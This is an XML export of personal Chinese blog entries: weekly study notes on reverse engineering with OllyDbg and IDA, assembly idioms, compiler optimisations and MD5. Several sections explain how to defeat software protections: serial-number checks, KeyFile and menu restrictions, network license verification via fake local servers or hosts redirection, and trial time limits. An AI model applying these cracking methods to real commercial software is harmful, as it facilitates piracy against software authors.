在栈窗口右键，执行’Address’-&gt;'Relative to ESP’可看到各个参数相对于当前ESP的地址，如果要得到第一个参数的地址，可以用[ESP+4],如果要得到指向的字符串，使用[[ESP+4]],表达式可用：[STRING [ESP+4]]==“…”(STRING前缀是“以0结尾的ASCII字符串”,还有UNICODE前缀等)</li>
</ol>
<h3 id="条件记录断点">条件记录断点</h3>
<p>可以记录断点处函数表达式或参数的值，也可以设置断点次数，每次符合条件暂停后计数值-1<br>
快捷键’Shift+F4’打开条件记录窗口<br>
条件记录断点可以向插件传递多个命令</p>
<h2 id="插件">插件</h2>
<p>OD只能加载32个插件<br>
添加插件可通过将插件复制到’plugin’文件夹中</p>
<h2 id="Run-trace">Run trace</h2>
<p>把程序执行过的指令保存下来。<br>
将地址、寄存器等记录到Run tarce 缓冲区中。如果缓冲区太小可能造成缓冲区溢出，OD会自动丢弃旧记录。<br>
数据可以在’查看’-&gt;‘RUN跟踪’里（或按’…‘）查看。使用’+‘和’-'浏览程序执行路线</p>
<h2 id="Hit-trace">Hit trace</h2>
<p>分辨哪一部分代码被执行了，哪一部分没有执行。在遇到一段跳转分支比较多的代码，需要了解程序执行路线时，可以用Hit trace。<br>
选中代码-&gt;右键-&gt;‘Hit trace’-&gt;‘Add selection’<br>
效果是执行过的指令前为红色，未执行的为蓝色：<br>
<img src="https://s2.ax1x.com/2020/02/28/3D6OqU.png" alt=""></p>
<p>ps：<strong>不要在监视的代码中设置断点</strong></p>
<h2 id="OD常见问题">OD常见问题</h2>
<h3 id="乱码">乱码</h3>
<ol>
<li>右键’分析’-&gt;‘分析代码’或快捷键’Ctrl+A’</li>
<li>右键’分析’-&gt;‘从模块中删除分析’，或在udd文件夹中删除相应文件</li>
</ol>
<h3 id="在反汇编窗口输入’push-E000’不能正确识别">在反汇编窗口输入’push E000’不能正确识别</h3>
<p>改为’push 0E000’</p>
<h3 id="od’假死’">od’假死’</h3>
<p>可能在调试加壳程序时产生<br>
打开’ollydbg.ini’设置’Restore windows 0’</p>
<h1>静态分析技术</h1>
<p>用高级语言写的程序有两种形式。</p>
<ol>
<li>程序被编译成机器语言在cpu上执行<br>
对于这种程序，可以将机器语言转化为汇编语言，这个过程称为<strong>反汇编</strong></li>
<li>边解释边执行（编写这种程序的语言称为解释性语言，如java）<br>
这种语言编译程序后可以被还原成高级语言的原始结构，这个过程被称为<strong>反编译</strong></li>
</ol>
<p>静态分析：通过反编译、反汇编获得程序的汇编代码或源代码，然后分析流程，了解模块的功能</p>
<h2 id="文件类型分析">文件类型分析</h2>
<p>逆向分析程序的第一步<br>
了解编写程序的语言、编译的编译器或是否被加密<br>
各种开发语言都有固定的启动代码，被加密程序处理过的程序中会留下加密软件的相关信息<br>
但有些外壳程序会将一些加壳信息去除，并伪造启动代码，从而欺骗了PEiD等检测分析软件。因此识别工具给出的结果只能作为参考</p>
<h2 id="IDA">IDA</h2>
<p>ida 是按区块装载pe文件的，例如.text代码块、.data数据块、.rsrc资源块、.idata输入表、.edata输出表。<br>
反编译过程分为两个阶段：</p>
<ol>
<li>将代码和数据分开，分析函数的参数调用、跳转等</li>
<li>装载对应的编译器特征文件，给各个函数赋名</li>
</ol>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.23-2020.03.29</title>
    <url>/50551.html</url>
    <content><![CDATA[<h1>32位软件逆向技术</h1>
<h2 id="控制语句">控制语句</h2>
<h3 id="条件设置指令（SETcc）">条件设置指令（SETcc）</h3>
<p>条件设置指令的形式是“SET<u>cc</u> r/m8”， r/m8表示8位寄存器或单字节内存单元<br>
条件设置指令测试一些标志位，把结果记录的目标操作数中<br>
测试：</p>
<ol>
<li>of（=1溢出）</li>
<li>zf（=1操作后等于0/相等）</li>
<li>cf（=1进位/低于）</li>
<li>cf、zf结合判断</li>
<li>sf（=1操作后结果为负）</li>
<li>pf（=1，1个数为偶数）</li>
<li>sf、of结合判断（=1小于）</li>
<li>zf（=1或zf!=of，不大于）</li>
</ol>
<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">https://brubbish.github.io/34199.html#标志寄存器</a></p>
</blockquote>
 <span id="more"></span>
<p>条件设置指令可以用来消除程序中的转移指令<br>
如：<br>
<img src="https://s1.ax1x.com/2020/03/22/8IMgHA.png" alt=" "></p>
<h3 id="纯算法实现逻辑判断">纯算法实现逻辑判断</h3>
<p>一些编译器在优化的时候，会不改变原逻辑的情况下，使用数学技巧把代码中的一些逻辑分支语句转换为算术操作，减少程序中的条件转移指令，提高cpu的流水线的性能（…tql)</p>
<h2 id="循环语句">循环语句</h2>
<p>可以进行反向引用<br>
其他类型的分支语句，如if-else都是由低地址向高地址区域引用的（向下跳），依此可以将循环语句识别出来（调回去）<br>
确定某段代码是循环代码后就可以分析计数器（一般用ecx）</p>
<p>如果编译时设置优化“Maximize Speed”：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx             ;变量初始化sum=0</span><br><span class="line">xor eax,eax             ；变量初始化i=0</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h2 id="数学运算符">数学运算符</h2>
<p>如果编译器没有进行优化，则这些运算符很容易理解（…)所以下面都是经过优化的</p>
<h3 id="整数的加法和减法">整数的加法和减法</h3>
<p>用lea代替add和sub<br>
lea指令允许用户在一个时钟内完成对c=a+b+78h（某个数）的计算，其中abc都是在有寄存器的情况下才有效的，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea c,[a+b+78]</span><br><span class="line">=&gt;</span><br><span class="line">mov eax,dword ptr [esp]     ;eax=a</span><br><span class="line">mov ecx,dword ptr [esp]     ;ecx=b</span><br><span class="line">lea edx,dword ptr [ecx+eax+78]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>时钟周期：一个时钟脉冲所需要的时间。（计组）</p>
</blockquote>
<h3 id="整数的乘法">整数的乘法</h3>
<p>一般被编译成mul（无符号）、imul（有符号）指令（运行慢），为了提高效率会用其他指令完成<br>
如果一个数是2的幂，用左移指令shl；3、5、6、7、9等数用加法提高效率：如把exa*5写成&quot;lea eax,[eax+4 *4];lea指令可以实现寄存器乘以2、4、8的运算</p>
<h3 id="整数的除法">整数的除法</h3>
<p>一般被编译成div、idiv指令，大概比乘法运算多消耗10倍cpu时钟<br>
如果除数是2的幂，可用右移指令’shr a,n’：a是被除数，n是2的指数（进行无符号数计算）有符号数用sar指令</p>
<p>除法指令需要用到符号扩展指令cdq，作用是把eax中的数视为有符号数，将eax的最高位（符号位）扩展到edx中。如果eax最高位是1，执行后edx=FFFFFFFF;如果是0，edx=00000000。通过这种方法把32位有符号数变为edx：eax的64位有符号数，满足64位运算指令的需要。</p>
<p>对除法优化时会用乘法代替除法，优化的公式较多，一例如：倒数相乘a*b=a *(1/b)</p>
<p>（在下面的64位中描述更完整）</p>
<h2 id="文本字符串">文本字符串</h2>
<h3 id="字符寻址指令">字符寻址指令</h3>
<p>与字符指针处理相关的指令有mov、lea等<br>
mov指令将地址/寄存器中的数据放到目的寄存器中，如mov eax [401000]/[ecx]<br>
lea（load effective address）操作数是地址,lea eax,[addr] 就是把addr的地址放入eax中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea eax,[401000]</span><br><span class="line">等价于</span><br><span class="line">mov eax,401000</span><br></pre></td></tr></table></figure>
<h3 id="计算字符串长度">计算字符串长度</h3>
<p>c语言的strlen()：<br>
<img src="https://s1.ax1x.com/2020/03/25/8xCwqg.png" alt=" "></p>
<h1>64位软件逆向技术</h1>
<p>x64通用寄存器的名称第一个字母由e改为r，共16个；16个128位xmm寄存器（通常用于优化代码）<br>
<img src="https://s1.ax1x.com/2020/03/25/8xCDaj.png" alt=" "></p>
<h2 id="函数">函数</h2>
<h3 id="栈平衡">栈平衡</h3>
<p>每8字节的栈空间用来保存一个数据<br>
尽量保证栈顶对齐值为16（可以被16整除）</p>
<h3 id="调用约定">调用约定</h3>
<p>x86（32位）的函数调用有stdcall、__cdecl、fastcall等，x64只有一种寄存器快速调用约定：</p>
<ol>
<li>整数：前四个参数用寄存器rcx→rdx→r8→r9，其余放在栈里，入栈顺序从右到左，任何大于8字节或不是1、2、4、8字节的参数用地址传递</li>
<li>浮点数：前四个参数用xmm寄存器完成：xmm0→xmm1→xmm2→xmm3</li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/25/8xCBZQ.png" alt=" "></p>
<p>栈为函数的前四个参数预留了32字节的空间，当函数功能复杂时将寄存器的参数保存到这个预留栈空间。预览栈空间由函数调用者申请、平衡</p>
<h2 id="数学运算">数学运算</h2>
<h3 id="整数的除法-2">整数的除法</h3>
<ol>
<li>有符号数，除数为2^n<br>
x&gt;=0,x/2^n=x&gt;&gt;n<br>
x&lt;0,x/2^n=（x+（2^n-1））&gt;&gt;n<br>
除数为-2^n时最后用’neg 寄存器’指令求补</li>
<li>有符号数，除数为正，非2^n<br>
32位：x&gt;=0,result=(x<em>c&gt;&gt;32)+x&gt;&gt;n,&lt;0时结果再+1<br>
64位：x&gt;=0,result=(x</em>c&gt;&gt;64)+x&gt;&gt;n,&lt;0时结果再+1</li>
<li>有符号数，除数为负，非2^n<br>
32位：x&gt;=0,result=(x<em>c&gt;&gt;32)-x&gt;&gt;n,&lt;0时结果再+1<br>
64位：x&gt;=0,result=(x</em>c&gt;&gt;64)-x&gt;&gt;n,&lt;0时结果再+1</li>
</ol>
<ul>
<li>c为魔数</li>
</ul>
<ol start="4">
<li>无符号数，除数位2^n<br>
用shr右移</li>
<li>无符号数，除数非2^n<br>
32位：x&gt;=0,result=x<em>c&gt;&gt;32&gt;&gt;n<br>
62位：x&gt;=0,result=x</em>c&gt;&gt;62&gt;&gt;n</li>
</ol>
<h2 id="整数取模">整数取模</h2>
<p>可以用除法指令，但是除法指令执行周期较长，通常优化将其转换成位运算或除法运算，再用除法运算进行优化</p>
<ol>
<li>除数b=2^n<br>
取得被除数二进制数的最后n位，负数要在n位之前补1：<br>
x&gt;=0,result=x&amp;(b-1);x&lt;0,result=(x&amp;(b-1))-1|(~b-1)+1</li>
<li>除数b!=2^n<br>
采用“余数=被除数-商<em>除数”<br>
result=x-x/b</em>b</li>
</ol>
<h1>使用 OllyDbg 从零开始 Cracking</h1>
<h2 id="数制系统">数制系统</h2>
<p>十六进制负数</p>
<p>从00000000~FFFFFFFF<br>
正数：00000000~7FFFFFFF<br>
负数：80000000~FFFFFFFF(-1)<br>
在od左下角的commandbar可查询十六进制数的十进制值和对应的ASCII字符：<u>? [十六进制值]</u></p>
<h2 id="寄存器">寄存器</h2>
<h3 id="标志寄存器">标志寄存器</h3>
<p><img src="https://s1.ax1x.com/2020/04/02/GGxsMQ.png" alt=" "></p>
<ol>
<li>
<p>o，溢出标志<br>
记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0</p>
</li>
<li>
<p>p，奇偶标志<br>
指令的结果用二进制表示时1的总数，如果为偶数PF=1，如果不为偶数PF=0</p>
</li>
<li>
<p>z，零标志<br>
记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</p>
</li>
<li>
<p>s，符号标志<br>
运算结果为负设置为1，结果为正设置为0</p>
</li>
<li>
<p>c，进位标志<br>
记录了无符号运算的结果是否有向更高位的进位（9位），有置1，无置0</p>
</li>
<li>
<p>其他</p>
</li>
</ol>
<h1>python爬虫学习</h1>
<p><a href="https://brubbish.github.io/710f8e5f.html##%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://brubbish.github.io/710f8e5f.html##正则表达式</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.16-2020.03.22</title>
    <url>/dcd92ddb.html</url>
    <content><![CDATA[<h1>32位软件逆向技术</h1>
<h2 id="数据结构">数据结构</h2>
<p>计算机存储、组织数据的方式。确定数据结构后，算法就很容易得到，有时候也根据特定算法来判断数据结构</p>
<h3 id="局部变量">局部变量</h3>
<p>局部变量分配空间时通常会使用栈和寄存器</p>
<span id="more"></span>
<h4 id="利用栈存放局部变量">利用栈存放局部变量</h4>
<p>变量分配与清除的形式：</p>
<ol>
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub esp,n</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">add esp,n</span><br></pre></td></tr></table></figure>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp,-n</span><br><span class="line">...用[ebp+xxxx]寻址</span><br><span class="line">sub esp,-n</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>(省空间)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push reg  ;(相当于sub esp，4)</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">pop reg</span><br></pre></td></tr></table></figure>
<p>局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据，因此需要进行初始化，一种方法是通过mov指令，另一种是用push，如：“push 5”</p>
<h4 id="利用寄存器存放局部变量">利用寄存器存放局部变量</h4>
<p>除了栈占用2个寄存器，编译器会利用其他6个通用寄存器尽可能的存放局部变量，如果寄存器不够用会存到栈中</p>
<h3 id="全局变量">全局变量</h3>
<p>全集变量通常位于.data区块的一个固定地址处，访问时一般会用一个固定的硬编码地址直接对内存进行寻址（←使用这种方式比较容易识别出这是一个全局变量。）<br>
一般编译器会将<em>全局变量</em>放到<em>可读</em>写的区块里，如果放到<em>只读</em>区块里就是一个<em>常量</em></p>
<h3 id="数组">数组</h3>
<p>访问一般时通过基址加变址寻址实现的（基址可以是常量也可以是寄存器）</p>
<h2 id="虚函数">虚函数</h2>
<p>虚函数是在程序运行时定义的函数。（c++）<br>
虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有对虚函数的引用通常放在一个专用数组-虚函数表（virtual table）中，数组中的元素存放的就是类中数表的地址。</p>
<blockquote>
<p>虚函数 是在基类中使用关键字 virtual 声明的函数。在派生类中重新定义基类中定义的虚函数时，<em>会告诉编译器不要静态链接到该函数</em>。<br>
基类：当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类，新建的类称为派生类。<br>
继承：代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物，因此，狗是动物，等等。(<span class="exturl" data-url="aHR0cDovL3J1bm9vYi5jb20=">runoob.com<i class="fa fa-external-link-alt"></i></span>)</p>
</blockquote>
<p>程序通过两次寻址得到虚函数的地址然后执行</p>
<h2 id="控制语句">控制语句</h2>
<h3 id="if-else">if-else</h3>
<p>通常为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp a,b</span><br><span class="line">jz/jnz(相当于je/jne) xxxx</span><br></pre></td></tr></table></figure>
<p>整数用cmp指令比较，浮点值用fcom、fcomp等指令比较<br>
许多情况下，编译器用test或or之类的较短的逻辑指令来替换cmp指令<br>
<img src="https://s1.ax1x.com/2020/03/19/8ssrPP.md.png" alt=" "></p>
<h3 id="switch-case">switch-case</h3>
<p>编译器会编译出一组由不同关系运算组成的语句</p>
<p>如果编译时设置优化选项为“Maximize Speed”，编译器会用&quot;dec eax&quot;代替cmp指令。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ecx</span><br><span class="line">lea eax,[esp]</span><br><span class="line">push eax</span><br><span class="line">push 0040804c</span><br><span class="line">call 004010A1   ;scanf</span><br><span class="line">mov eax,[esp+8] ;将输入的值传给eax</span><br><span class="line">add esp,00000008</span><br><span class="line"></span><br><span class="line">dec dax         ;检查eax是否为1h</span><br><span class="line">je 00401055</span><br><span class="line">                ;zf记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</span><br><span class="line">                ;je:等于则转移(检测zf=1) </span><br><span class="line"></span><br><span class="line">(同理也可使用sub eax,xxxxxx判断是否为其他值)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h3 id="转移指令机器码的计算">转移指令机器码的计算</h3>
<p>短转移：无条件和有条件的<em>机器码均为2字节</em>，范围为-128~127（2^8）<br>
长转移：无条件的机器码为<u>5字节</u>，条件转移为<u>6字节</u>。因为无条件用一个字节（jmp）表示转移类型；条件转移用2个字节（如je、jns），用其他四个字节表示偏移量<br>
子程序调用指令：调用的参数不涉及寄存器、栈等值的类似于长转移；涉及的例如“call dword ptr [eax+2]”  比较复杂，不表（…）<br>
条件转移指令的范围是16位遗留下的。<br>
cpu开发人员只给目的地址分配了1字节（8位），将跳转的长度限制在225字节之内</p>
<p>无条件短转移的机器码形式为:“EBxx”。B00H~EB4F是向后转移，EB80~EBFFH是向前转移</p>
<p>转移指令的机器码形式为：<br>
位移量=目的地址-起始地址-跳转指令本身长度<br>
转移指令机器码=转移类别机器码(如前文中的EB）+位移量</p>
<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%B9%E6%8D%AE%E4%BD%8D%E7%A7%BB%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A7%BB%E7%9A%84%E6%84%8F%E4%B9%89">https://brubbish.github.io/34199.html#根据位移进行转移的意义</a></p>
</blockquote>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFC6O.png" alt="jmp 401005对应机器码EB03"></p>
<h1>python爬虫学习</h1>
<p>记录的有点乱，还没整理好<br>
学习的原因是 看了某个论坛上一个学了几周爬虫 后用其爬的结果回答的答主 遂感牛逼，再加上有时候想学点别的作为调节（🤦‍）<br>
<a href="https://brubbish.github.io/710f8e5f.html">https://brubbish.github.io/710f8e5f.html</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.06-2020.04.12</title>
    <url>/51835.html</url>
    <content><![CDATA[<h1>菜单功能限制</h1>
<h2 id="相关函数">相关函数</h2>
<p>要将软件菜单和窗口变得不可用，可用以下函数</p>
<ol>
<li>EnableMenultem()<br>
允许或进制指定的菜单条目<br>
参数：菜单句柄、目标菜单条目的标识符、控制标志（允许、灰化、禁止等）<br>
返回值：返回菜单以前的状态</li>
<li>EnableWindow()<br>
允许或禁止指定窗口<br>
参数：窗口句柄、true/false<br>
返回值：0表示失败，非0表示成功</li>
</ol>
<span id="more"></span>
<h2 id="拆解菜单限制保护">拆解菜单限制保护</h2>
<p>修改控制标志或true/false</p>
<h1>KeyFile保护</h1>
<p>付费后将作者提供的注册文件keyfile放到指定目录下可用让软件成为正版<br>
软件每次启动时都会读取该文件，然后利用某种算法进行处理，以此判断结果是否正确</p>
<h2 id="相关api函数">相关api函数</h2>
<table>
<thead>
<tr>
<th>api函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>FindFirstA</td>
<td>确定文件是否存在</td>
</tr>
<tr>
<td>CreateFileA、_lopen</td>
<td>确定文件是否存在；打开文件获得其句柄</td>
</tr>
<tr>
<td>GetFileSizeA、GetFileEx</td>
<td>获得文件的大小</td>
</tr>
<tr>
<td>GetFileSize、GetFileAttributesExA</td>
<td>获得文件的属性</td>
</tr>
<tr>
<td>SetFilePointer、GetFilePointerEx</td>
<td>移动文件指针</td>
</tr>
<tr>
<td>ReadFile</td>
<td>读取文件内容</td>
</tr>
</tbody>
</table>
<h1>网络验证</h1>
<p>思路是拦截服务器返回的数据包，分析程序是如何处理数据包的</p>
<h2 id="相关函数-2">相关函数</h2>
<p>常用的有send()、recv()【这两个是socket（套接字，计算机之间进行通信的一种约定或一种方式）函数】、WSASend()、WSARecv()等</p>
<h2 id="破解网络验证的一般思路">破解网络验证的一般思路</h2>
<p>如果验证的数据包内容固定，可以抓取数据包，写一个本地服务端模拟服务器<br>
如果不固定则需要找出相应的算法</p>
<ol>
<li>分析发送的数据包<br>
在od中对send()之类的函数设断，分析加密的位置和方式</li>
<li>分析接收的数据包<br>
客户端程序使用recv()之类的函数接收数据，然后进行解密。对解密后数据存放的地址下内存读断点</li>
<li>解除网络验证<br>
编写一个服务端，模拟服务器来接收和发送数据<br>
如果软件用域名登陆服务器，可以修改hosts，使域名指向本地<br>
如果软件用ip地址连接服务器，可以用inet_addr或connect等设断，将ip地址修改为本地ip地址，或用代理软件将ip地址指向本地</li>
</ol>
<p>网络验证的关键是数据包分析</p>
<h1>常用断点设置</h1>
<p><img src="https://s1.ax1x.com/2020/04/09/GInJdU.png" alt=" "></p>
<h1>加密算法</h1>
<h2 id="单向散列算法">单向散列算法</h2>
<p>即hash算法，是将任意长度的消息压缩到某一固定长度的函数（不可逆）<br>
因为是不可逆算法，只能使用hash函数作为加密的一个中间步骤。如，对用户名进行hash变换，再用这个结果进行可逆的加密变换，生成注册码</p>
<h3 id="MD5算法">MD5算法</h3>
<p>MD5消息摘要算法<br>
对任意长度的消息进行运算，产生128位的消息摘要</p>
<h4 id="算法原理">算法原理</h4>
<ol>
<li>数据填充<br>
填充消息，使消息长度（bit）对512求余的结果等于448【比512的倍数小64位】（本身满足了也要）。方法是：附一个1在后面，然后用0来填充。</li>
<li>添加长度<br>
在结尾用64位记录原文长度，最终消息长度是512的整数倍</li>
<li>初始化变量<br>
MD5的结果按32位一组分成4组，由4个寄存器（A、B、C、D）进行演变得到<br>
寄存器初始值为：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原本应为：</span><br><span class="line">A=0x01234567</span><br><span class="line">B=0x89ABCDEF</span><br><span class="line">C=0xFEDCBA98</span><br><span class="line">D=0x76543210</span><br><span class="line">为了在内存中也长那样↑，所以要调整成：</span><br><span class="line">A = 0x67452301;</span><br><span class="line">B = 0xEFCDAB89;</span><br><span class="line">C = 0x98BADCFE;</span><br><span class="line">D = 0x10325476;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>数据处理<br>
4个辅助函数：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X, Y, Z) =(X&amp;Y) | ((~X) &amp; Z)</span><br><span class="line">G(X, Y, Z) =(X&amp;Z) | (Y &amp; (~Z))</span><br><span class="line">H(X, Y, Z) =X^Y^Z</span><br><span class="line">I(X, Y, Z)=Y^(X|(~Z))</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/04/09/GInbFg.png" alt="流程"><br>
将ABCD的副本abcd中的3个经过运算后与第四个相加，再加上两个常数，并将所得的值<strong>循环左移</strong>s位，最后将所得结果加上abcd之一，回送至ABCD（一次子循环）</p>
<ul>
<li>执行的函数和次数：<br>
先执行16次F,再执行16次G…共64次（每次主循环）<br>
主循环次数：原文长度/512（全部消息）</li>
<li>相加的两个常数：<br>
一个是<strong>利用第2步的原文</strong>，将其等分成16份（每份长度为32位），循环使用其中一份。<br>
另一个是4^32*abs(sin(i))得到的整数部分,在第i步中，i用弧度表示。目的是用正弦函数和幂函数消除变换中的线性</li>
<li>循环左移位数s：有个表<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmJmj.png" alt=" "></li>
</ul>
<ol start="5">
<li>输出</li>
</ol>
<h4 id="分析">分析</h4>
<p>用peid插件krypto analyzer分析，得知程序含有md5的迭代常数，可以猜测使用了md5算法<br>
输入的注册码后进行长度等的判断以及数据初步处理：<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmt7n.png" alt=""><br>
上图call的地址里的代码，通过mov的4个数判断在进行md5初始化：<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmY0s.png" alt="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法" title="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法"></p>
<h3 id="SHA算法">SHA算法</h3>
<p>只看了一点，就放到下周的周报上了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.30-2020.04.05</title>
    <url>/20849.html</url>
    <content><![CDATA[<h1>关于上周博客炸了的问题</h1>
<p>原因是两个_config.yml（可能还有其他文件吧）里所有缩进都不见了…不知道是为啥，就甩给 vscode 和格式化代码插件吧（…)<br>
然后，原来 .yml 要用缩进表示层级啊…<br>
嗯顺便换了个主题</p>
<h1>64 位软件逆向技术</h1>
<h2 id="虚函数">虚函数</h2>
<p>c++的三大核心机制是封装、继承、多态，虚函数是多态的一种体现。在逆向过程中，虚函数是一种还原面向对象代码的重要手段</p>
<h3 id="虚表">虚表</h3>
<p>不同的类虚表不同，相同的类对象共享一个虚表<br>
（以下讲的是用 c++写的程序）<br>
在构造函数中，首先初始化虚表指针，然后初始化数据成员，最后返回 this 指针</p>
<span id="more"></span>
<p>c++语法规定，析构函数需要调用虚函数的无多态性，因此析构函数首先需要赋值虚表<br>
构造函数和析构函数特征一致，可根据调用的先后顺序确定<br>
虚表地址在全局数据区中</p>
<h1>序列号（注册码）保护方式</h1>
<h2 id="序列号保护机制">序列号保护机制</h2>
<p>验证用户名和序列号之间的映射关系（…也有可能没有关系）<br>
检查方法：</p>
<ol>
<li>将用户名等信息通过变换后得到注册码<br>
序列号=F（用户名）<br>
这个方法计算出的序列号以明文形式在内存中出现<br>
也可通过修改比较指令的方法通过检查<br>
再现了生成注册码的过程，不安全</li>
<li>通过注册码验证用户名<br>
生成注册码时：序列号=F（用户名），检查注册码时：用户名=F^（-1）（序列号）<br>
生成注册码的函数和注册码明文未出现在软件代码中<br>
破解可考虑：1.修改比较指令，2.通过 F^(-1)找出 F</li>
<li>通过对等函数检查<br>
F1（用户名）=F2（序列号）<br>
与 2 类似</li>
<li>同时将用户名和序列号作为自变量<br>
特定值=F（用户名，序列号）<br>
可能失去了用户名和序列号的一一对应关系</li>
</ol>
<h2 id="攻击序列号保护机制">攻击序列号保护机制</h2>
<p>找到序列号或修改判断序列号后的跳转指令<br>
跟踪程序启动时（需要将注册码读出并判断）或输入注册码，对 api 设置断点<br>
常用：</p>
<ol>
<li>
<p>将输入的内容复制到缓冲区： GetWindowTextA(W)、GetDlgItemTextA(W)、GetDlgItemInt</p>
</li>
<li>
<p>判断后显示的对话框：MessageBoxA(W)、MessageBoxExA(W)、ShowWindow、MessageBoxIndirectA(W)、CreateDialogParamA(W)、CreateDialogIndirectParamA(w)、DialogBoxParamA(W)、DialogBoxIndirectParamA(W)</p>
</li>
<li>
<p>启动时读取注册码：<br>
RegQueryValueExA(W)(序列号放在注册表);<br>
GetPrivateProfileStringA(W)、GetPrivateProfileIntA(W)、GetProfileIntA(W)、GetProfileStringA(W)(序列号放在 INI 文件中);<br>
CreateFileA(W)、_lopen()(放在一般文件)</p>
</li>
</ol>
<h3 id="数据约束性">数据约束性</h3>
<p>只用在明文比较注册码的保护方式中使用。大多数情况下，真正的注册码会在某个时刻出现在内存中，一般会在用户输入的 ±90h。<br>
例如，用 od 按’Alt+M’打开内存窗口，'Ctrl+B’打开搜索框，搜索输入的序列号，可在附近查找到真序列号</p>
<h3 id="利用消息断点">利用消息断点</h3>
<p>按下和释放鼠标时会发送 WM_LBUTTONDOWN 和 WM_LUBTTONUP 消息，用这个消息下断点可以找到按钮的事件代码</p>
<h3 id="利用提示信息">利用提示信息</h3>
<p>当输入错时提示“序列号错误，再来一次”等，可以查找相应的字符串，定位到相关代码<br>
如 od 中，右键“search for”-&gt;“all referenced text string”</p>
<h2 id="字符串比较形式">字符串比较形式</h2>
<ol>
<li>寄存器直接比较</li>
<li>函数比较<br>
比较内容放在寄存器或栈中<br>
call 一个用于比较的函数，可能是 api 函数或自己写的</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call ....</span><br><span class="line">test eax,eax</span><br><span class="line">jz   ....      ;zf=1-&gt;eax=0 跳转</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>串比较</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea edi [   ] ;edi指向字符串a</span><br><span class="line">lea esi [   ] ;....</span><br><span class="line">repz cmpsd    ;比较</span><br></pre></td></tr></table></figure>
<p>edi、esi：变址寄存器，存放存储单元在段内的偏移量。<br>
rep：按 ecx 中指定次数或在 zf 不满足条件前重复。<br>
如果 ds:si 和 es:di 所指向的两个字节相等，则继续比较。REP（重复）、REPE（相等时重复）、REPNE（不相等时重复）、REPZ（为零时重复）及 REPNZ（不为零时重复）<br>
<img src="https://s1.ax1x.com/2020/04/02/GGvR3D.png" alt=" "><br>
CMPSB 比较字节 CMPSW 比较字 CMPSD 比较双字 ,方向标志位决定 ESI 和 EDI 的增加或减少</p>
<h1>警告窗口</h1>
<p>常用的方法是修改程序的资源、静态分析、动态分析<br>
显示窗口的常用函数有 MessageBoxA(W)、MessageBoxExA(W)、DialogBoxParamA(W)、ShowWindow、CreateWindowExA(W)等，对某些警告窗口无效时可以尝试利用消息设置断点拦截</p>
<h1>时间限制</h1>
<h2 id="计时器">计时器</h2>
<p>对于限制每次运行时长的软件</p>
<ol>
<li>setTimer 函数<br>
应用程序在初始化时调用这个 api 函数，申请计时器并设定时间间隔，同时获得一个处理计时器超时的回调函数。若超时，系统会向申请的窗口发送 WM_TIMER 或调用那个回调函数。当程序不需要计时器，调用 KillTimer()进行销毁</li>
<li>高精度多媒体计时器<br>
调用 timeSetEvent()</li>
<li>其它<br>
timeGetTime()、GetTickCount()，返回的都是系统启动以来经历过的时间，函数的精度取决于系统的设置；也可以利用各高级语言开发库里的函数实现计时，如 c 语言里的 time()（返回 1970.01.01 0 时起至今的秒数）</li>
</ol>
<p>精度太高会对系统性能造成影响，故一般不需要太高精度。</p>
<h2 id="时间限制">时间限制</h2>
<p>试用期<br>
